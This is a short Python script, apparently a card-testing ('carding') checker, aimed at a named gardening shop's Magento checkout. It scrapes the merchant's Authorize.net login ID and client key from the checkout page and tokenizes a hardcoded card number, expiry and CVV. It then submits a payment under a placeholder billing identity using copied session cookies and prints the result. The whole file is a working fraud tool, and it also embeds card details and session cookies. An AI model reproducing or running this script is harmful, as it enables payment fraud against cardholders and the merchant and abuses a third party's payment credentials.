import requests
import json



import requests

url = "https://www.evergreengrowers.com/checkout/"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'referer': "https://www.evergreengrowers.com/anystis-baccarum-crazee-mite.html",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie': "_gcl_au=1.1.2103878883.1714135327; _ga=GA1.1.1000340405.1714135327; form_key=a9hmEJssMdkvbCSW; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; wp_ga4_customerId=18845; wp_ga4_customerGroup=General; form_key=a9hmEJssMdkvbCSW; X-Magento-Vary=9bf9a599123e6402b85cde67144717a08b817412; mage-cache-sessid=true; mage-messages=; private_content_version=1b0872e8fd37d557fc38cc0ec846c72c; PHPSESSID=7a528ba5631d2f66f1262f65d735e2de; section_data_ids=%7B%22customer%22%3A1714135393%2C%22compare-products%22%3A1714135393%2C%22last-ordered-items%22%3A1714135393%2C%22cart%22%3A1714135443%2C%22directory-data%22%3A1714135443%2C%22captcha%22%3A1714135393%2C%22instant-purchase%22%3A1714135393%2C%22loggedAsCustomer%22%3A1714135393%2C%22persistent%22%3A1714135393%2C%22review%22%3A1714135393%2C%22wishlist%22%3A1714135393%2C%22wp_ga4%22%3A1714135443%2C%22recently_viewed_product%22%3A1714135393%2C%22recently_compared_product%22%3A1714135393%2C%22product_data_storage%22%3A1714135393%2C%22paypal-billing-agreement%22%3A1714135393%2C%22ajaxpro-cart%22%3A1714135443%2C%22messages%22%3A1714135443%7D; _ga_4FPQM4SXZQ=GS1.1.1714135327.1.1.1714135442.0.0.0"
}

response = requests.get(url, headers=headers)

c=(response.text.split('"apiLoginId":')[1].split('"')[1])
cl=(response.text.split('"clientKey":')[1].split('"')[1])

url = "https://api2.authorize.net/xml/v1/request.api"

payload = json.dumps({
  "securePaymentContainerRequest": {
    "merchantAuthentication": {
      "name": c,
      "clientKey": cl
    },
    "data": {
      "type": "TOKEN",
      "id": "7e5812a2-10b1-5bb1-b26f-2370eb355a21",
      "token": {
        "cardNumber": "4159770035621639",
        "expirationDate": "012027",
        "cardCode": "837"
      }
    }
  }
})

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'Origin': "https://www.evergreengrowers.com",
  'Sec-Fetch-Site': "cross-site",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://www.evergreengrowers.com/",
  'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
}

response = requests.post(url, data=payload, headers=headers)

tok=(response.text.split('"dataValue":')[1].split('"')[1])
url = "https://www.evergreengrowers.com/rest/default/V1/carts/mine/payment-information"

payload = json.dumps({
  "cartId": "67329",
  "billingAddress": {
    "countryId": "US",
    "regionId": "43",
    "regionCode": "NY",
    "region": "New York",
    "street": [
      "New York City State Park"
    ],
    "company": "New York ",
    "telephone": "12058809966",
    "postcode": "10080",
    "city": "New York ",
    "firstname": "Jones",
    "lastname": "Jones",
    "save_in_address_book": 1,
    "saveInAddressBook": None
  },
  "paymentMethod": {
    "method": "authnetcim",
    "additional_data": {
      "save": True,
      "cc_type": "VI",
      "cc_exp_year": "2027",
      "cc_exp_month": "1",
      "cc_cid": "837",
      "card_id": None,
      "acceptjs_key": "COMMON.ACCEPT.INAPP.PAYMENT",
      "acceptjs_value": tok,
      "cc_last4": "1639",
      "cc_bin": "415977"
    }
  }
})

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Content-Type': "application/json",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'origin': "https://www.evergreengrowers.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.evergreengrowers.com/checkout/",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie': "_gcl_au=1.1.2103878883.1714135327; _ga=GA1.1.1000340405.1714135327; form_key=a9hmEJssMdkvbCSW; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; wp_ga4_customerId=18845; wp_ga4_customerGroup=General; form_key=a9hmEJssMdkvbCSW; X-Magento-Vary=9bf9a599123e6402b85cde67144717a08b817412; mage-cache-sessid=true; mage-messages=; PHPSESSID=7a528ba5631d2f66f1262f65d735e2de; _ga_4FPQM4SXZQ=GS1.1.1714135327.1.1.1714135485.0.0.0; private_content_version=a2ddcace6f51c88bf788d87aa16cc0c3; section_data_ids=%7B%22customer%22%3A1714135393%2C%22compare-products%22%3A1714135393%2C%22last-ordered-items%22%3A1714135393%2C%22cart%22%3A1714135443%2C%22directory-data%22%3A1714135443%2C%22captcha%22%3A1714135393%2C%22instant-purchase%22%3A1714135393%2C%22loggedAsCustomer%22%3A1714135393%2C%22persistent%22%3A1714135393%2C%22review%22%3A1714135393%2C%22wishlist%22%3A1714135393%2C%22wp_ga4%22%3A1714135487%2C%22recently_viewed_product%22%3A1714135393%2C%22recently_compared_product%22%3A1714135393%2C%22product_data_storage%22%3A1714135393%2C%22paypal-billing-agreement%22%3A1714135393%2C%22messages%22%3A1714135492%7D"
}

response = requests.post(url, data=payload, headers=headers)

print(response.text)